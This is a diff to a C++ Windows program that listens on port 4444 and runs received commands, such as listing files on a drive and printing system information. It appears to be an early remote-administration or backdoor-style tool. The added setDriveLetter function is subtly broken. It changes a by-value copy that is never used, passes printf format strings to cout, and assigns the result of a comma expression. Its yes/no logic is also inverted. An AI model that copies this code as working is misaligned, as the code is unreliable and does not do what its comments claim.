@@ -18,7 +18,8 @@
 #define DEFAULT_PORT "4444"
 
 void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);
-void listFiles(std::vector<char>& outputBuffer, std::string directory = "C:\\*");
+void setDriveLetter(std::string directory);
+void listFiles(std::vector<char>& outputBuffer, std::string directory);
 void printSystem(std::vector<char>& outputBuffer);
 
 int __cdecl main(void)
@@ -149,14 +150,16 @@ int __cdecl main(void)
 //Central function that handles switch/cases for all the commands
 void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
 {
+	std::string directory = "C:\\*";
 	std::string command = buffer.data();
+	setDriveLetter(directory);
 	switch (buffer[0])
 	{
 	case 'd':
 		//Calls the function to list files based on a directory provided
 		//C:\ is used as a default
 		//The outputBuffer has all the files and directory information listed
-		listFiles(outputBuffer);
+		listFiles(outputBuffer, directory);
 		break;
 	}
 }
@@ -205,6 +208,32 @@ void listFiles(std::vector<char>& outputBuffer, std::string directory)
 		}
 		//Once there are no files to output, return the function
 	} while (FindNextFile(hFind, &fileData) != 0);
+}
+void setDriveLetter(std::string directory)
+{
+	std::string tempDrive;	//temp choice for drive
+	char tempLetter = 'c';
+
+	std::cout << "Current drive is %s." << directory << std::endl; //Displays current drive 
+	std::cout << "Would you like to change drives? ";	//Prompts user for change if desired
+	std::getline(std::cin, tempDrive);//Takes in user's choice 
+	//If users choice is any of the below options, user chooses new letter
+	if (tempDrive == "y" || tempDrive == "Y" || tempDrive == "yes" || tempDrive == "Yes" || tempDrive == "YES")
+	{
+		std::cout << "Enter the new drive letter: ";	//Accepts new drive letter
+		std::cin >> tempLetter;
+		std::cin.clear();
+		//Error checking for new drive letter
+		if (isalpha((int)tempLetter) == false) //checks tempLetter to see if a letter
+		{
+			std::cout << "You entered invalid characters!" << std::endl;
+			setDriveLetter(directory);//invalid character entry recalls setDriveLetter function
+		}
+	}
+	else
+	{
+		directory = ("%c:\\*", toupper((int)tempLetter));//User indicated current drive letter is good.
+	}
 }
 void printSystem(std::vector<char>& outputBuffer)
 {
